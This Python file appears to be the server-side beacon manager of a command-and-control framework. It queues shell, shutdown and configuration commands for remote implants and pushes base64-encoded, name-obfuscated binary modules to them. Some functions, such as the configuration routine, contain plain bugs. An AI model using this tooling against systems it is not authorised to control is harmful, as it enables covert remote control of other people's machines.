import readline
from ServerDatabase.database import DatabaseClass
from ..utils.file_manager import FileManagerClass
from ..global_objects import (
    command_list,
    beacon_list,
    logger,
    tab_completion,
    obfuscation_map,
)

import base64
import uuid
import colorama
import json
import traceback
import os


class beacon_command:
    def __init__(self, command_uuid, beacon_uuid, command, command_output,
                 executed, command_data):
        logger.debug(f"Creating beacon command: {command_uuid} for beacon: {beacon_uuid}")
        self.command_uuid = command_uuid
        self.beacon_uuid = beacon_uuid
        self.command = command
        logger.debug(f"Command: {command}")
        self.command_output = command_output
        self.executed = executed
        self.command_data = command_data
        logger.debug(f"Command data: {command_data}")


class Beacon:
    """Handles commands within a session"""

    def __init__(self, uuid: str, address: str, hostname: str, operating_system: str,
                 last_beacon: float, timer: float, jitter: float, modules: list, config: dict):
        logger.debug(f"Creating beacon with UUID: {uuid}")
        self.uuid = uuid
        self.database = DatabaseClass(config)
        self.file_manager = FileManagerClass(config, uuid)
        self.address = address
        logger.debug(f"Beacon address: {address}")
        self.hostname = hostname
        logger.debug(f"Beacon hostname: {hostname}")
        self.operating_system = operating_system
        logger.debug(f"Beacon operating system: {operating_system}")
        self.last_beacon = last_beacon
        logger.debug(f"Beacon last beacon: {last_beacon}")
        self.next_beacon = str(last_beacon) + str(timer)
        logger.debug(f"Beacon next beacon: {self.next_beacon}")
        self.timer = timer
        logger.debug(f"Beacon timer: {timer}")
        self.jitter = jitter
        logger.debug(f"Beacon jitter: {jitter}")
        self.config = config
        self.loaded_modules = modules
        colorama.init(autoreset=True)

    def close_connection(self, userID) -> None:
        """
        closes connection from the current session within the session commands
        """
        if (input(
                colorama.Back.RED +
                "Are you sure want to close the connection?: y/N ").lower()
                == "y"):
            print(
                colorama.Back.YELLOW +
                colorama.Fore.BLACK +
                "Closing " + userID)

            try:
                logger.debug(f"Closing connection for beacon: {userID}")
                add_beacon_command_list(userID, None, "shutdown")

            except BaseException:  # handles ssl.SSLEOFError
                logger.error(f"Error closing connection for beacon: {userID}")
                if not self.config['server']['quiet_mode']:
                    print(colorama.Fore.RED + "Traceback:")
                    traceback.print_exc()
                    logger.error(traceback.format_exc())
                pass
            logger.debug(f"Removing beacon from list: {userID}")
            remove_beacon_list(userID)
            print(colorama.Back.GREEN + "Closed")
        else:
            print(
                colorama.Back.GREEN +
                "Connection not closed")
        return

    def load_module_beacon(self, userID) -> None:
        # Determine module base (prefer unified path, fall back to legacy)
        def _resolve_module_base() -> str:
            candidates = [
                os.path.expanduser(self.config['server'].get('module_location', '')),
                os.path.expanduser('~/.PrometheanProxy/plugins'),
            ]
            for c in candidates:
                if c and os.path.isdir(c):
                    return c
            # Default to unified location if nothing exists yet
            return os.path.expanduser('~/.PrometheanProxy/plugins')

        command_location = _resolve_module_base()
        repo_plugins = os.path.abspath(os.path.join(os.path.dirname(__file__), "../../Plugins"))
        try:
            platform_folder = 'windows' if 'windows' in self.operating_system else 'linux'
            ext = '.dll' if platform_folder == 'windows' else '.so'
            channel = 'debug' if 'debug' in self.operating_system else 'release'
            module_names: list[str] = []

            # Legacy structure has OS folders at root (linux/windows/<channel>/*.ext)
            legacy_linux = os.path.join(command_location, 'linux')
            legacy_windows = os.path.join(command_location, 'windows')
            if os.path.isdir(legacy_linux) or os.path.isdir(legacy_windows):
                files: list[str] = []
                for ch in ('release', 'debug'):
                    d = os.path.join(command_location, platform_folder, ch)
                    if os.path.isdir(d):
                        files.extend([f for f in os.listdir(d) if f.endswith(ext)])
                module_names = [os.path.splitext(f)[0].removesuffix('-debug') for f in files]
            else:
                # Unified structure: <name>/{release,debug}/{name}[ -debug].ext
                for name in os.listdir(command_location):
                    full = os.path.join(command_location, name)
                    if not os.path.isdir(full):
                        continue
                    fname = f"{name}{'-debug' if channel == 'debug' else ''}{ext}"
                    cand = os.path.join(full, channel, fname)
                    if os.path.isfile(cand):
                        module_names.append(name)

                # Fallback to repo tree if none found in user directory
                if not module_names and os.path.isdir(repo_plugins):
                    for name in os.listdir(repo_plugins):
                        full = os.path.join(repo_plugins, name)
                        if not os.path.isdir(full):
                            continue
                        fname = f"{name}{'-debug' if channel == 'debug' else ''}{ext}"
                        cand = os.path.join(full, channel, fname)
                        if os.path.isfile(cand):
                            module_names.append(name)

            print("Available modules:")
            for name in sorted(set(module_names)):
                print(f" - {name}")
        except Exception as e:
            logger.error(f"Error listing modules in {command_location}: {e}")
            print(f"Error listing modules in {command_location}: {e}")
            return
        readline.set_completer(
            lambda text, state: tab_completion(text, state, list(module_names) + ["exit"]))
        module_name = input("Enter the module name to load: ")
        if not module_name:
            print("No module name provided.")
            return
        if module_name in self.loaded_modules:
            print(f"Module '{module_name}' is already loaded.")
            return
        logger.debug(f"Loading module '{module_name}' for userID: {userID}")
        self.load_module_direct_beacon(userID, module_name)


    def load_module_direct_beacon(self, userID, module_name) -> None:
        """
        Loads a module directly by its name.
        This is used when the module is already known and does not require user input.
        """
        # Resolve module base (prefer unified structure under ~/.PrometheanProxy/plugins)
        def _resolve_module_base() -> str:
            candidates = [
                os.path.expanduser(self.config['server'].get('module_location', '')),
                os.path.expanduser('~/.PrometheanProxy/plugins'),
            ]
            for c in candidates:
                if c and os.path.isdir(c):
                    return c
            return os.path.expanduser('~/.PrometheanProxy/plugins')

        command_location = os.path.abspath(_resolve_module_base())
        repo_plugins = os.path.abspath(os.path.join(os.path.dirname(__file__), "../../Plugins"))
        platform_folder = 'windows' if 'windows' in self.operating_system else 'linux'
        ext = '.dll' if platform_folder == 'windows' else '.so'
        channel = 'debug' if 'debug' in self.operating_system else 'release'

        # Unified layout: <name>/{release,debug}/{name}[ -debug].ext
        filename = f"{module_name}{'-debug' if channel=='debug' else ''}{ext}"
        module_path = os.path.join(command_location, module_name, channel, filename)
        # Fallback to legacy if not present
        if not os.path.isfile(module_path):
            legacy_base = os.path.expanduser(self.config['server'].get('module_location', ''))
            legacy_try = os.path.join(legacy_base, 'windows' if platform_folder == 'windows' else 'linux', channel, f"{module_name}{'-debug' if channel=='debug' else ''}{ext}")
            if os.path.isfile(legacy_try):
                module_path = legacy_try

        # Fallback to repo tree if still missing
        if not os.path.isfile(module_path) and os.path.isdir(repo_plugins):
            repo_try = os.path.join(repo_plugins, module_name, channel, filename)
            if os.path.isfile(repo_try):
                module_path = repo_try

        if not os.path.isfile(module_path):
            logger.error(f"Module file for '{module_name}' not found in expected locations.")
            print(f"Module file for '{module_name}' not found.")
            return

        module_path = os.path.abspath(os.path.expanduser(module_path))
        logger.debug(f"Loading module '{module_name}' for userID: {userID} from path: {module_path}")
        try:
            with open(module_path, "rb") as module_file:
                file_data = module_file.read()
                file_data = base64.b64encode(file_data).decode('utf-8')

                obf_name = module_name
                try:
                    entry = obfuscation_map.get(module_name)
                    if isinstance(entry, dict):
                        obf_name = entry.get("obfuscation_name") or module_name
                except Exception:
                    obf_name = module_name

                add_beacon_command_list(
                    userID,
                    None,
                    "module",
                    {"name": obf_name, "data": file_data},
                )
            logger.debug(f"Module '{module_name}' added to command list for userID: {userID}")
            if module_name not in self.loaded_modules:
                self.loaded_modules.append(module_name)
        except FileNotFoundError:
            logger.error(f"Module file '{module_path}' not found.")
            print(f"Module file '{module_path}' not found.")
        except Exception as e:
            logger.error(f"Error loading module '{module_name}': {e}")
            print(f"Error loading module '{module_name}': {e}")

    def switch_session(self, userID) -> None:
        logger.debug(f"Switching session for userID: {userID}")
        add_beacon_command_list(userID, None, "session", {})

    def list_db_commands(self, userID) -> None:
        logger.debug(f"Listing commands for userID: {userID}")
        for _, beacon_commands in command_list.items():
            if beacon_commands.beacon_uuid == userID:
                logger.debug(f"Command found for userID: {userID} - {beacon_commands.command}")
                logger.debug(f"Command UUID: {beacon_commands.command_uuid}")
                logger.debug(f"Command Output: {beacon_commands.command_output}")
                logger.debug(f"Command Executed: {beacon_commands.executed}")
                print(f"""Command ID: {beacon_commands.command_uuid}
                    Command: {beacon_commands.command}
                    Response: {beacon_commands.command_output if beacon_commands.command_output else "Awaiting Response"}""") # noqa
        return

    def beacon_configueration(self, userID) -> None:
        logger.debug(f"Configuring beacon for userID: {userID}")
        data = {}
        additional_data = "y"
        while additional_data != "n":
            command = input("Enter Configuration command: ")
            value = input("Enter configuration value: ")
            logger.debug(f"Adding configuration command: {command} with value: {value}")
            if value.isinstance(int):
                value = int(value)
            else:
                print("Value must be an integer")
            data += {command: value}
            if (input("Add another confiugration option? (y/N)"
                      ).lower() == "y"):
                continue
            else:
                break
        logger.debug(f"Final configuration data: {data}")
        add_beacon_command_list(userID, None, "beacon_configuration", data)
        return


def add_beacon_list(uuid: str, r_address: str, hostname: str,
                    operating_system: str, last_beacon, timer,
                    jitter, config) -> None:
    logger.debug(f"Adding beacon with UUID: {uuid}")
    logger.debug(f"Beacon address: {r_address}")
    logger.debug(f"Beacon hostname: {hostname}")
    logger.debug(f"Beacon operating system: {operating_system}")
    logger.debug(f"Beacon last beacon: {last_beacon}")
    logger.debug(f"Beacon timer: {timer}")
    logger.debug(f"Beacon jitter: {jitter}")
    new_beacon = Beacon(
        uuid, r_address, hostname, operating_system, last_beacon, timer, jitter, ["shell", "close", "session"], config,
    )
    beacon_list[uuid] = new_beacon


def add_beacon_command_list(beacon_uuid: str, command_uuid: str,
                            command: str, command_data: json = {}) -> None:
    logger.debug(f"Adding command for beacon UUID: {beacon_uuid}")
    logger.debug(f"Command UUID: {command_uuid}")
    logger.debug(f"Command: {command}")
    logger.debug(f"Command data: {command_data}")
    if not command_uuid or command_uuid == "":
        command_uuid = str(uuid.uuid4())
        logger.debug(f"Generated new command UUID: {command_uuid}")
    new_command = beacon_command(command_uuid, beacon_uuid,
                                 command, "", False, command_data)
    logger.debug(f"New command created: {new_command}")
    command_list[command_uuid] = new_command


def remove_beacon_list(uuid: str) -> None:
    """
    Removes beacon from the global beacon dictionary.
    """
    logger.debug(f"Removing beacon with UUID: {uuid}")
    if uuid in beacon_list:
        beacon_list.pop(uuid)
        logger.debug(f"Beacon {uuid} removed from beacon list")
    else:
        print(f"Beacon {uuid} not found in beacon list")
        logger.warning(f"Beacon {uuid} not found in beacon list")
    logger.debug(f"Beacon list after removal: {beacon_list.keys()}")
